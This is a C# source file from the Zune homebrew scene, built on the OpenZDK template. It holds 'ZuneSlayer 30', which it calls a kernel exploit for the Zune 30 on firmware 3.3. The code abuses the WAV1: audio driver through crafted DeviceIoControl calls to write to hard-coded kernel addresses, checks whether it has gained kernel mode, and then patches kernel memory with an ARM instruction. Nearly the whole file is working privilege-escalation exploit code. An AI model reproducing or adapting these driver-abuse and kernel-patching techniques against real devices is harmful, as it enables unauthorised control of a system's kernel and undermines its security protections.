/*  _____                         ________   ____    __  __
 * /\  __`\                      /\_____  \ /\  _`\ /\ \/\ \
 * \ \ \/\ \  _____     __    ___\/____//'/'\ \ \/\ \ \ \/'/'
 *  \ \ \ \ \/\ '__`\ /'__`\/' _ `\   //'/'  \ \ \ \ \ \ , <
 *   \ \ \_\ \ \ \L\ \\  __//\ \/\ \ //'/'___ \ \ \_\ \ \ \\`\
 *    \ \_____\ \ ,__/ \____\ \_\ \_\/\_______\\ \____/\ \_\ \_\
 *     \/_____/\ \ \/ \/____/\/_/\/_/\/_______/ \/___/  \/_/\/_/
 *              \ \_\
 *               \/_/ OpenZDK Release 1 | 2010-04-14
 *
 * Program.cs
 * Copyright (c) 2010 itsnotabigtruck.
 * No rights reserved.
 * 
 * All rights are waived to the maximum extent possible; see
 * http://creativecommons.org/publicdomain/zero/1.0/ for more information
 *
 * Replace this banner when writing your own applications
 */

// deployed 3.1.10527.100 with edt

/* 
	ZuneSlayer 30

	Kernel Exploit for Zune 30 (keel) (offsets specific to fw v3.3)

	Shy Bairns Get Nowt
 */

using System;
using System.Diagnostics;
using System.IO;

namespace ZuneBoards.DevelopmentFront.NativeAppLauncher.SD
{
    static class Program
    {
        const string SourceDirectory = @"\gametitle\584E07D1\";
        const string Payload =         @"Content\nativeapp.exe";

        static void Main(string[] args)
        {
            Run();
        }
        public static void Run()
        {

            unsafe
            {
                int le = 0;
                int b = 1;
                uint cur = 0;

                Trace.WriteLine("[*] ==== ZuneSlayer by CUB3D ====");

                Trace.WriteLine("[*] Are we in kernel mode?");
                cur = NativeMethods.IsBadReadPtr(0x80000000, 0x10);
                Trace.WriteLine("[*] IsBadReadPtr(Kernel) = " + cur.ToString("X"));

                // already in kernel, just run it
                if (cur == 0)
                {
                    Program.func1(0);
                    return;
                }

                Trace.WriteLine("[*] Open driver");
                int file = NativeMethods.CreateFileW("WAV1:", 0x80000000, 0, 0, 3, 0x80, 0);

                uint* outb = (uint*)NativeMethods.calloc(1024, 1);
                uint* inp = (uint*)NativeMethods.calloc(1024, 1);
                uint* outp = (uint*)NativeMethods.calloc(1024, 1);

                uint tgt_val = 0;
                uint tgt_addr = 0x88f81a94;

                Trace.WriteLine("[*] Writing g_seggregate = 0");

                if (true)
                {
                    Trace.WriteLine("[*] Writing tgt_val = " + tgt_val.ToString("X"));
                    *inp = 0; // unused
                    *(inp + 1) = 0x11; // cmd
                    *(inp + 2) = 0; // d
                    *(inp + 3) = tgt_val; // b
                    *(inp + 4) = 0; //c
                    b = NativeMethods.DeviceIoControl(file, 0x1d000c, (int)inp, 1024, (int)outb, 1024, (int)outp, 0);
                    le = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                    Trace.WriteLine("[*] stage1, b = " + b.ToString("X") + ", LE:" + le.ToString("X") + ", ob: " + (*outb).ToString("X"));

                        if (b != 0)
                        {
                            Trace.WriteLine("[*] OK, Writing tgt_addr = " + tgt_addr.ToString("X"));

                            *inp = 0; // unused
                            *(inp + 1) = 0x10; //cmd
                            *(inp + 2) = 0; // d
                            *(inp + 3) = tgt_addr; //b
                            *(inp + 4) = 0; // c
                            b = NativeMethods.DeviceIoControl(file, 0x1d000c, (int)inp, 1024, (int)outb, 1024, (int)outp, 0);
                            le = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                            Trace.WriteLine("[*] stage 2, b = " + b.ToString("X") + ", LE:" + le.ToString("X") + ", ob: " + (*outb).ToString("X"));
                        }
                }


                Trace.WriteLine("[*] Are we in kernel mode now?");
                cur = NativeMethods.IsBadReadPtr(0x80000000, 0x10);
                Trace.WriteLine("[*] IsBadReadPtr(Kernel) = " + cur.ToString("X"));
                if (cur == 0)
                {
                    Trace.WriteLine("[*] Slay!");
                }

                // No work, because we aren' a kthread but we are killing one?
                if (false)
                {
                    // spawn kernel thread
                    FPTR cb = new FPTR(Program.func1);
                    uint h = NativeMethods.CreateThread(0, 0, cb, 0, 0, 0);
                    // le = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                    // Trace.WriteLine("hhhh = " + h.ToString("X") + ", LE:" + le.ToString("X"));
                }

            }

        }

        public static int func1(int a)
        {
            //Trace.WriteLine("Hi from thread");
            unsafe
            {
                byte* foo = (byte*)0x88213b44;
                for (int y = 0; y < 3; y++)
                {
                    Trace.Write("[*] ");
                    for (int x = 0; x < 16; x++)
                    {
                        byte f = *(foo + x);
                        string s = f.ToString("X");
                        if (s.Length < 2)
                        {
                            s = "0" + s;
                        }
                        Trace.Write(s + " ");
                    }
                    Trace.WriteLine("");
                    foo += 16;
                }

                Trace.WriteLine("[*] Writing *0x88213b44 = 0xe3a00005");

                foo = (byte*)0x88213b44;
                uint* foo1 = (uint*)foo;
                *foo1 = 0xe3a00005;

                for (int y = 0; y < 3; y++)
                {
                    Trace.Write("[*] ");
                    for (int x = 0; x < 16; x++)
                    {
                        byte f = *(foo + x);
                        string s = f.ToString("X");
                        if (s.Length < 2)
                        {
                            s = "0" + s;
                        }
                        Trace.Write(s + " ");
                    }
                    Trace.WriteLine("");
                    foo += 16;
                }
                
            }

            Trace.WriteLine("");
            Trace.WriteLine("");
            Trace.WriteLine("");

            //NativeMethods.ExitThread(0x69);

            return 0;
        }
    }
}
